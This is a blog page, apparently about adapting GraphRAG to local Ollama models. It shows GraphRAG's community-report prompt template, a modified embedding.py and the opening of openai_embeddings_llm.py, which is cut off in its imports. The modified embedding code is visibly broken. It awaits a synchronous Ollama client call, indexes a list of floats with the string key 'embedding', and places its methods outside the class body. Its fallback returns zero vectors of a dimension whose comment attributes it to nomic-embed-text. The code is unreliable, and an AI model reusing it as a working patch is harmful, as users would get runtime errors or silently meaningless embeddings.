class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">You are an AI assistant that helps a human analyst to perform general information discovery. Information discovery is the process of identifying and assessing relevant information associated with certain entities (e.g., organizations and individuals) within a network.</span><br><span class="line"></span><br><span class="line"># Goal</span><br><span class="line">Write a comprehensive report of a community, given a list of entities that belong to the community as well as their relationships and optional associated claims. The report will be used to inform decision-makers about information associated with the community and their potential impact. The content of this report includes an overview of the community&#x27;s key entities, their legal compliance, technical capabilities, reputation, and noteworthy claims.</span><br><span class="line"></span><br><span class="line"># Report Structure</span><br><span class="line"></span><br><span class="line">The report should include the following sections:</span><br><span class="line"></span><br><span class="line">- TITLE: community&#x27;s name that represents its key entities - title should be short but specific. When possible, include representative named entities in the title.</span><br><span class="line">  - SUMMARY: An executive summary of the community&#x27;s overall structure, how its entities are related to each other, and significant information associated with its entities.</span><br><span class="line">  - IMPACT SEVERITY RATING: a float score between 0-10 that represents the severity of IMPACT posed by entities within the community.  IMPACT is the scored importance of a community.</span><br><span class="line">  - RATING EXPLANATION: Give a single sentence explanation of the IMPACT severity rating.</span><br><span class="line">  - DETAILED FINDINGS: A list of 5-10 key insights about the community. Each insight should have a short summary followed by multiple paragraphs of explanatory text grounded according to the grounding rules below. Be comprehensive.</span><br><span class="line"></span><br><span class="line">Return output as a well-formed JSON-formatted string with the following format:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;title&quot;: &lt;report_title&gt;,</span><br><span class="line">        &quot;summary&quot;: &lt;executive_summary&gt;,</span><br><span class="line">        &quot;rating&quot;: &lt;impact_severity_rating&gt;,</span><br><span class="line">        &quot;rating_explanation&quot;: &lt;rating_explanation&gt;,</span><br><span class="line">        &quot;findings&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_1_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_1_explanation&gt;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_2_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_2_explanation&gt;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"># Grounding Rules</span><br><span class="line"></span><br><span class="line">Points supported by data should list their data references as follows:</span><br><span class="line"></span><br><span class="line">&quot;This is an example sentence supported by multiple data references [Data: &lt;dataset name&gt; (record ids); &lt;dataset name&gt; (record ids)].&quot;</span><br><span class="line"></span><br><span class="line">Do not list more than 5 record ids in a single reference. Instead, list the top 5 most relevant record ids and add &quot;+more&quot; to indicate that there are more.</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">&quot;Person X is the owner of Company Y and subject to many allegations of wrongdoing [Data: Reports (1), Entities (5, 7); Relationships (23); Claims (7, 2, 34, 64, 46, +more)].&quot;</span><br><span class="line"></span><br><span class="line">where 1, 5, 7, 23, 2, 34, 46, and 64 represent the id (not the index) of the relevant data record.</span><br><span class="line"></span><br><span class="line">Do not include information where the supporting evidence for it is not provided.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Example Input</span><br><span class="line">-----------</span><br><span class="line">Text:</span><br><span class="line"></span><br><span class="line">Entities</span><br><span class="line"></span><br><span class="line">id,entity,description</span><br><span class="line">5,VERDANT OASIS PLAZA,Verdant Oasis Plaza is the location of the Unity March</span><br><span class="line">6,HARMONY ASSEMBLY,Harmony Assembly is an organization that is holding a march at Verdant Oasis Plaza</span><br><span class="line"></span><br><span class="line">Relationships</span><br><span class="line"></span><br><span class="line">id,source,target,description</span><br><span class="line">37,VERDANT OASIS PLAZA,UNITY MARCH,Verdant Oasis Plaza is the location of the Unity March</span><br><span class="line">38,VERDANT OASIS PLAZA,HARMONY ASSEMBLY,Harmony Assembly is holding a march at Verdant Oasis Plaza</span><br><span class="line">39,VERDANT OASIS PLAZA,UNITY MARCH,The Unity March is taking place at Verdant Oasis Plaza</span><br><span class="line">40,VERDANT OASIS PLAZA,TRIBUNE SPOTLIGHT,Tribune Spotlight is reporting on the Unity march taking place at Verdant Oasis Plaza</span><br><span class="line">41,VERDANT OASIS PLAZA,BAILEY ASADI,Bailey Asadi is speaking at Verdant Oasis Plaza about the march</span><br><span class="line">43,HARMONY ASSEMBLY,UNITY MARCH,Harmony Assembly is organizing the Unity March</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;title&quot;: &quot;Verdant Oasis Plaza and Unity March&quot;,</span><br><span class="line">    &quot;summary&quot;: &quot;The community revolves around the Verdant Oasis Plaza, which is the location of the Unity March. The plaza has relationships with the Harmony Assembly, Unity March, and Tribune Spotlight, all of which are associated with the march event.&quot;,</span><br><span class="line">    &quot;rating&quot;: 5.0,</span><br><span class="line">    &quot;rating_explanation&quot;: &quot;The impact severity rating is moderate due to the potential for unrest or conflict during the Unity March.&quot;,</span><br><span class="line">    &quot;findings&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Verdant Oasis Plaza as the central location&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Verdant Oasis Plaza is the central entity in this community, serving as the location for the Unity March. This plaza is the common link between all other entities, suggesting its significance in the community. The plaza&#x27;s association with the march could potentially lead to issues such as public disorder or conflict, depending on the nature of the march and the reactions it provokes. [Data: Entities (5), Relationships (37, 38, 39, 40, 41,+more)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Harmony Assembly&#x27;s role in the community&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Harmony Assembly is another key entity in this community, being the organizer of the march at Verdant Oasis Plaza. The nature of Harmony Assembly and its march could be a potential source of threat, depending on their objectives and the reactions they provoke. The relationship between Harmony Assembly and the plaza is crucial in understanding the dynamics of this community. [Data: Entities(6), Relationships (38, 43)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Unity March as a significant event&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;The Unity March is a significant event taking place at Verdant Oasis Plaza. This event is a key factor in the community&#x27;s dynamics and could be a potential source of threat, depending on the nature of the march and the reactions it provokes. The relationship between the march and the plaza is crucial in understanding the dynamics of this community. [Data: Relationships (39)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Role of Tribune Spotlight&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Tribune Spotlight is reporting on the Unity March taking place in Verdant Oasis Plaza. This suggests that the event has attracted media attention, which could amplify its impact on the community. The role of Tribune Spotlight could be significant in shaping public perception of the event and the entities involved. [Data: Relationships (40)]&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Real Data</span><br><span class="line"></span><br><span class="line">Use the following text for your answer. Do not make anything up in your answer.</span><br><span class="line"></span><br><span class="line">Text:</span><br><span class="line">&#123;input_text&#125;</span><br><span class="line"></span><br><span class="line">The report should include the following sections:</span><br><span class="line"></span><br><span class="line">- TITLE: community&#x27;s name that represents its key entities - title should be short but specific. When possible, include representative named entities in the title.</span><br><span class="line">  - SUMMARY: An executive summary of the community&#x27;s overall structure, how its entities are related to each other, and significant information associated with its entities.</span><br><span class="line">  - IMPACT SEVERITY RATING: a float score between 0-10 that represents the severity of IMPACT posed by entities within the community.  IMPACT is the scored importance of a community.</span><br><span class="line">  - RATING EXPLANATION: Give a single sentence explanation of the IMPACT severity rating.</span><br><span class="line">  - DETAILED FINDINGS: A list of 5-10 key insights about the community. Each insight should have a short summary followed by multiple paragraphs of explanatory text grounded according to the grounding rules below. Be comprehensive.</span><br><span class="line"></span><br><span class="line">Return output as a well-formed JSON-formatted string with the following format:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;title&quot;: &lt;report_title&gt;,</span><br><span class="line">        &quot;summary&quot;: &lt;executive_summary&gt;,</span><br><span class="line">        &quot;rating&quot;: &lt;impact_severity_rating&gt;,</span><br><span class="line">        &quot;rating_explanation&quot;: &lt;rating_explanation&gt;,</span><br><span class="line">        &quot;findings&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_1_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_1_explanation&gt;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_2_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_2_explanation&gt;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"># Grounding Rules</span><br><span class="line"></span><br><span class="line">Points supported by data should list their data references as follows:</span><br><span class="line"></span><br><span class="line">&quot;This is an example sentence supported by multiple data references [Data: &lt;dataset name&gt; (record ids); &lt;dataset name&gt; (record ids)].&quot;</span><br><span class="line"></span><br><span class="line">Do not list more than 5 record ids in a single reference. Instead, list the top 5 most relevant record ids and add &quot;+more&quot; to indicate that there are more.</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">&quot;Person X is the owner of Company Y and subject to many allegations of wrongdoing [Data: Reports (1), Entities (5, 7); Relationships (23); Claims (7, 2, 34, 64, 46, +more)].&quot;</span><br><span class="line"></span><br><span class="line">where 1, 5, 7, 23, 2, 34, 46, and 64 represent the id (not the index) of the relevant data record.</span><br><span class="line"></span><br><span class="line">Do not include information where the supporting evidence for it is not provided.</span><br><span class="line"></span><br><span class="line">Output:</span><br></pre></td></tr></table></figure><p>embedding.py:  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) 2024 Microsoft Corporation.</span></span><br><span class="line"><span class="comment"># Licensed under the MIT License</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;OpenAI Embedding model implementation.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tiktoken</span><br><span class="line"><span class="keyword">from</span> tenacity <span class="keyword">import</span> (</span><br><span class="line">    AsyncRetrying,</span><br><span class="line">    RetryError,</span><br><span class="line">    Retrying,</span><br><span class="line">    retry_if_exception_type,</span><br><span class="line">    stop_after_attempt,</span><br><span class="line">    wait_exponential_jitter,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.base <span class="keyword">import</span> BaseTextEmbedding</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.oai.base <span class="keyword">import</span> OpenAILLMImpl</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.oai.typing <span class="keyword">import</span> (</span><br><span class="line">    OPENAI_RETRY_ERROR_TYPES,</span><br><span class="line">    OpenaiApiType,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.text_utils <span class="keyword">import</span> chunk_text</span><br><span class="line"><span class="keyword">from</span> graphrag.query.progress <span class="keyword">import</span> StatusReporter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OpenAIEmbedding</span>(BaseTextEmbedding, OpenAILLMImpl):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wrapper for OpenAI Embedding models.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    api_key: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    azure_ad_token_provider: <span class="type">Callable</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    model: <span class="built_in">str</span> = <span class="string">&quot;text-embedding-3-small&quot;</span>,</span></span><br><span class="line"><span class="params">    deployment_name: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_base: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_version: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_type: OpenaiApiType = OpenaiApiType.OpenAI,</span></span><br><span class="line"><span class="params">    organization: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    encoding_name: <span class="built_in">str</span> = <span class="string">&quot;cl100k_base&quot;</span>,</span></span><br><span class="line"><span class="params">    max_tokens: <span class="built_in">int</span> = <span class="number">8191</span>,</span></span><br><span class="line"><span class="params">    max_retries: <span class="built_in">int</span> = <span class="number">10</span>,</span></span><br><span class="line"><span class="params">    request_timeout: <span class="built_in">float</span> = <span class="number">180.0</span>,</span></span><br><span class="line"><span class="params">    retry_error_types: <span class="built_in">tuple</span>[<span class="built_in">type</span>[BaseException]] = OPENAI_RETRY_ERROR_TYPES,  <span class="comment"># type: ignore</span></span></span><br><span class="line"><span class="params">    reporter: StatusReporter | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    OpenAILLMImpl.__init__(</span><br><span class="line">        <span class="variable language_">self</span>=<span class="variable language_">self</span>,</span><br><span class="line">        api_key=api_key,</span><br><span class="line">        azure_ad_token_provider=azure_ad_token_provider,</span><br><span class="line">        deployment_name=deployment_name,</span><br><span class="line">        api_base=api_base,</span><br><span class="line">        api_version=api_version,</span><br><span class="line">        api_type=api_type,  <span class="comment"># type: ignore</span></span><br><span class="line">        organization=organization,</span><br><span class="line">        max_retries=max_retries,</span><br><span class="line">        request_timeout=request_timeout,</span><br><span class="line">        reporter=reporter,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.model = model</span><br><span class="line">    <span class="variable language_">self</span>.encoding_name = encoding_name</span><br><span class="line">    <span class="variable language_">self</span>.max_tokens = max_tokens</span><br><span class="line">    <span class="variable language_">self</span>.token_encoder = tiktoken.get_encoding(<span class="variable language_">self</span>.encoding_name)</span><br><span class="line">    <span class="variable language_">self</span>.retry_error_types = retry_error_types</span><br><span class="line">    <span class="variable language_">self</span>.embedding_dim = <span class="number">384</span>  <span class="comment"># Nomic-embed-text model dimension</span></span><br><span class="line">    <span class="variable language_">self</span>.ollama_client = ollama.Client()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">embed</span>(<span class="params">self, text: <span class="built_in">str</span>, **kwargs: <span class="type">Any</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">float</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Embed text using Ollama&#x27;s nomic-embed-text model.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        embedding = <span class="variable language_">self</span>.ollama_client.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=text)</span><br><span class="line">        <span class="keyword">return</span> embedding[<span class="string">&quot;embedding&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error embedding text&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> np.zeros(<span class="variable language_">self</span>.embedding_dim).tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">aembed</span>(<span class="params">self, text: <span class="built_in">str</span>, **kwargs: <span class="type">Any</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">float</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Embed text using Ollama&#x27;s nomic-embed-text model asynchronously.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        embedding = <span class="keyword">await</span> <span class="variable language_">self</span>.ollama_client.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=text)</span><br><span class="line">        <span class="keyword">return</span> embedding[<span class="string">&quot;embedding&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error embedding text asynchronously&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> np.zeros(<span class="variable language_">self</span>.embedding_dim).tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_embed_with_retry</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, text: <span class="built_in">str</span> | <span class="built_in">tuple</span>, **kwargs: <span class="type">Any</span>  <span class="comment">#str | tuple</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">list</span>[<span class="built_in">float</span>], <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        retryer = Retrying(</span><br><span class="line">            stop=stop_after_attempt(<span class="variable language_">self</span>.max_retries),</span><br><span class="line">            wait=wait_exponential_jitter(<span class="built_in">max</span>=<span class="number">10</span>),</span><br><span class="line">            reraise=<span class="literal">True</span>,</span><br><span class="line">            retry=retry_if_exception_type(<span class="variable language_">self</span>.retry_error_types),</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> retryer:</span><br><span class="line">            <span class="keyword">with</span> attempt:</span><br><span class="line">                embedding = (</span><br><span class="line">                    <span class="variable language_">self</span>.sync_client.embeddings.create(  <span class="comment"># type: ignore</span></span><br><span class="line">                        <span class="built_in">input</span>=text,</span><br><span class="line">                        model=<span class="variable language_">self</span>.model,</span><br><span class="line">                        **kwargs,  <span class="comment"># type: ignore</span></span><br><span class="line">                    )</span><br><span class="line">                    .data[<span class="number">0</span>]</span><br><span class="line">                    .embedding</span><br><span class="line">                    <span class="keyword">or</span> []</span><br><span class="line">                )  </span><br><span class="line">                <span class="keyword">return</span> (embedding[<span class="string">&quot;embedding&quot;</span>], <span class="built_in">len</span>(text))</span><br><span class="line">    <span class="keyword">except</span> RetryError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error at embed_with_retry()&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> why not just throw in this case?</span></span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_aembed_with_retry</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, text: <span class="built_in">str</span> | <span class="built_in">tuple</span>, **kwargs: <span class="type">Any</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">list</span>[<span class="built_in">float</span>], <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        retryer = AsyncRetrying(</span><br><span class="line">            stop=stop_after_attempt(<span class="variable language_">self</span>.max_retries),</span><br><span class="line">            wait=wait_exponential_jitter(<span class="built_in">max</span>=<span class="number">10</span>),</span><br><span class="line">            reraise=<span class="literal">True</span>,</span><br><span class="line">            retry=retry_if_exception_type(<span class="variable language_">self</span>.retry_error_types),</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">for</span> attempt <span class="keyword">in</span> retryer:</span><br><span class="line">            <span class="keyword">with</span> attempt:</span><br><span class="line">                embedding = (</span><br><span class="line">                    <span class="keyword">await</span> <span class="variable language_">self</span>.async_client.embeddings.create(  <span class="comment"># type: ignore</span></span><br><span class="line">                        <span class="built_in">input</span>=text,</span><br><span class="line">                        model=<span class="variable language_">self</span>.model,</span><br><span class="line">                        **kwargs,  <span class="comment"># type: ignore</span></span><br><span class="line">                    )</span><br><span class="line">                ).data[<span class="number">0</span>].embedding <span class="keyword">or</span> []</span><br><span class="line">                <span class="keyword">return</span> (embedding, <span class="built_in">len</span>(text))</span><br><span class="line">    <span class="keyword">except</span> RetryError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error at embed_with_retry()&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> why not just throw in this case?</span></span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>openai_embeddings_llm.py:  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) 2024 Microsoft Corporation.</span></span><br><span class="line"><span class="comment"># Licensed under the MIT License</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;The EmbeddingsLLM class.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing_extensions <span 